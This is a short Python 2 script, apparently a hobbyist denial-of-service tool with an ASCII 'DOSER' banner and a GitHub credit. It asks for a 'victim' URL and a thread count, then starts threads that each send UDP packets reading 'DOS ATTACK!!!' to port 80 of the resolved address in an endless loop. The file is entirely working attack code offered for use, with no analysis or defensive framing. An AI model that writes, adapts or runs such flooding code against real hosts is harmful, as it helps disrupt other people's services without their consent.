#Python2
#RiTaX or optichawk
import time, socket, sys, thread

print'''
\033[92m                    ,,                                    
`7MM"""Yb.        `7MM                                    
  MM    `Yb.        MM                                  \033[0m  
  MM     `Mb   ,M""bMM  ,pW"Wq.  ,pP"Ybd  .gP"Ya `7Mb,od8 
  MM      MM ,AP    MM 6W'   `Wb 8I   `" ,M'   Yb  MM' "' 
  MM     ,MP 8MI    MM 8M     M8 `YMMMa. 8M""""""  MM   \033[91m  
  MM    ,dP' `Mb    MM YA.   ,A9 L.   I8 YM.    ,  MM     
.JMMmmmdP'    `Wbmd"MML.`Ybmd9'  M9mmmP'  `Mbmmd'.JMML.                                            \n  
\033[1m[+]\033[96mhttps://github.com/optichawk'''
victim_addr = raw_input("\033[91mEnter The URL (example.com): ")
thread_count = input("Enter the counts of thread you wish to launch: ")
victim_ip = socket.gethostbyname(victim_addr)

UDP_PORT = 80
MESSAGE = "\033[92mDOS ATTACK!!!"
print "\033[93mUDP target IP:", victim_ip
print "UDP target port:", UDP_PORT
time.sleep(3)

def dos(i):
	while True:	
			sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			sock.sendto(MESSAGE, (victim_ip, UDP_PORT))
			time.sleep(1)
			print "\033[93mPacket Sent!"
		
for i in xrange(thread_count):
	try:
	 thread.start_new_thread( dos , ("Thread-"+str(i),) )
	except KeyboardInterrupt:
			sys.exit(0)
while 1:
  pass
